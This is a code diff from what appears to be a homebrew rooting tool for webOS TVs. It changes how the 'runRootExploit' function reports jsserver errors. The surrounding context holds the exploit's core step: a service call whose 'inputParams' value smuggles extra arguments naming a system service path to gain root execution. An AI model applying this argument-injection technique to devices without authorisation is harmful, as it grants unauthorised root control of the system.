@@ -110,7 +110,6 @@
     function runRootExploit() {
       setState('pending', 'preparing root execution...');
    var workymgs='Yippee root exploit is worky!!!Setting homebrew up...';
-
       var payloadBase = new URL('./payload/', window.location.href).toString();
       var files = [
         'package.json' , 
@@ -126,16 +125,26 @@
         var bridge = new window.PalmServiceBridge();
         bridge.onservicecallback = function(payload) {
           var parsed = parse(payload);
-		console.log(parsed);
-          if ( parsed.returnValue === false && parsed.error.includes("trusted locations")  ) {
+          if ( typeof(parsed.error) === 'string' && parsed.error.includes("trusted locations")  ) {
             failStep('jsserver', 'jsserver is patched.Trying workaround');
         var patched = new window.PalmServiceBridge();
 		  patched.onservicecallback = function(payload) {
           var parsed = parse(payload);
-	   if (parsed.returnValue === false && parsed.error.includes("trusted locations") ) {
+	   if (typeof(parsed.error) === 'string'  && parsed.error.includes("trusted locations") ) {
             failStep('jsserver', 'Workaround is no worky.');
 	   }else if ( parsed.returnValue === false) {
-            failStep('jsserver', parsed.error || 'jsserver call failed');
+		   //if the error msg is from webos not jsserver
+		   //then the error mgs would be in errorText
+		   //however error mgs from jsserver is in error
+		   if (typeof(parsed.error) === 'undefined'){
+            failStep('jsserver', parsed.errorText );
+		   }else if (typeof(parsed.errorText) === 'undefined'){
+            failStep('jsserver', parsed.error );
+			   
+		   } else {
+            failStep('jsserver', 'jsserver call failed');
+
+		   }
 	   }else {
             setState('success', workymgs);
 	   }
@@ -144,7 +153,15 @@
           JSON.stringify({"inputParams": "QwQ -- /tmp/cgroup /usr/palm/services/com.webos.service.accountmanager " + targetDir}));
 
 	  } else if ( parsed.returnValue === false) {
-            failStep('jsserver', parsed.error || 'jsserver call failed');
+  if (typeof(parsed.error) === 'undefined'){
+            failStep('jsserver', parsed.errorText );
+		   }else if (typeof(parsed.errorText) === 'undefined'){
+            failStep('jsserver', parsed.error );
+			   
+		   } else {
+            failStep('jsserver', 'jsserver call failed');
+
+		   }
 	  } else {
             setState('success', workymgs);
 	  }
